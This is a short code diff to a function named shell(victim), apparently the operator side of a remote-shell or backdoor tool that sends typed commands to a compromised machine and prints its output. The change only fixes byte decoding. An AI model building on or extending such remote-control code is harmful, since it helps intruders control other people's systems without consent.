@@ -54,10 +54,14 @@ def shell(victim):
   cmd=input(prompt)
   while cmd!='exit':
     victim.send(cmd)
-    prompt_out=victim.receive()
+    prompt_out=victim.receive(as_bytes=True)
     # * is separator between prompt and output
-    out="*".join(prompt_out.split('*')[1:])
-    prompt=prompt_out.split('*')[0]
+    out=b"*".join(prompt_out.split(b'*')[1:])
+    try:
+      out=out.decode()
+    except UnicodeDecodeError:
+      pass
+    prompt=prompt_out.split(b'*')[0].decode()
     if out!='':
       # dont print too much \n
       if out[-1]=="\n":
